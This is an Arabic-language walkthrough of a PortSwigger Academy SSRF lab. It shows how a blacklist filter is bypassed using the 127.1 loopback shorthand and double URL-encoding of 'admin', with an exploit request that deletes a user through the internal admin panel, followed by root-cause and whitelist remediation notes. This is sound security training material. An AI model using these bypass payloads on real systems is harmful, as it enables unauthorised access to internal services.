# Lab 03 — SSRF with Blacklist-Based Input Filter (تجاوز فلاتر القائمة السوداء بـ 127.1 والتشفير)

[![التصنيف](https://img.shields.io/badge/الفئة-SSRF-red)]()
[![النوع](https://img.shields.io/badge/النوع-SSRF%20with%20Blacklist%20Bypass-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> هذا الشرح جزء من سلسلة [معامل تزوير الطلبات (SSRF)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 03 — SSRF with Blacklist-Based Input Filter (تجاوز فلاتر القائمة السوداء بـ 127.1 والتشفير) |
| **تصنيف الثغرة** | SSRF with Blacklist Bypass |
| **معيار الضعف (CWE)** | CWE-918: Server-Side Request Forgery (SSRF) |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | تجاوز قائمتين سوداوين تمنعان كلمة 127.0.0.1 وكلمة admin للوصول للوحة وحذف carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

وضع المطور هنا قائمتين سوداوين (Blacklists):
1. **الفلتر الأول:** إذا وجد في الرابط `127.0.0.1` أو كلمة `localhost`، يرفض الطلب.
2. **الفلتر الثاني:** إذا وجد في المسار كلمة `admin`، يرفض الطلب.

**أساليب الالتفاف (Bypasses):**
1. **تجاوز الـ IP:** نظام التشغيل يفهم الاختصار `127.1` كمعادل رسمي لـ `127.0.0.1`، والفلتر الساذج لا يمنع `127.1`!
2. **تجاوز كلمة admin:** إذا قمت بتشفير حرف واحد مرتين (Double URL Encoding) مثل حرف `a` ليصبح `%25%36%31` (أو كلمة admin كاملة): يتجاوز الفلتر الأول لأن النص لا يطابق "admin"، وعندما يرسل خادم الويب الطلب للباك إند يفك التشفير وتتحول الكلمة إلى `admin` الأصلية!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستغل ثغرات تمثيل عناوين الـ IP والتشفير المزدوج لتجاوز الفلاتر القائمة على حظر الكلمات الصريحة.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
الاعتماد على القوائم السوداء (Blacklists) التي يسهل الالتفاف حولها دائماً في هجمات الويب.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. التقط طلب فحص المخزون `POST /product/stock` وأرسله إلى **Repeater**.
2. جرب إرسال `http://127.0.0.1/` ستجد رسالة خطأ تحظر الرابط.
3. استبدل الـ IP بالاختصار المسموح:
`http://127.1/` (ستلاحظ أن السيرفر قبله ورد بـ `200 OK`).
4. الآن جرب إضافة مسار `/admin`: ستجد أن السيرفر حظر الطلب لأن كلمة `admin` ممنوعة.
5. قم بتشفير حرف `a` مرتين: الحرف `a` في الـ Hex هو `%61`، وتشفير علامة `%` يعطي `%2561`.
6. عدل الرابط ليصبح:
`stockApi=http://127.1/%2561dmin/delete?username=carlos`.
7. اضغط Send: سيمر الطلب من الفلترين بنجاح ويتم حذف carlos!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/%2561dmin/delete?username=carlos
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 302 Found
Location: /admin
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز أنظمة الحماية وجدران التطبيقات (WAF) والوصول للأهداف الداخلية.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

الاعتماد على القوائم البيضاء (Whitelists) الصارمة، والتحقق من الـ IP المحلول بعد الـ DNS وليس قبل الفحص.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Top 10 — A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
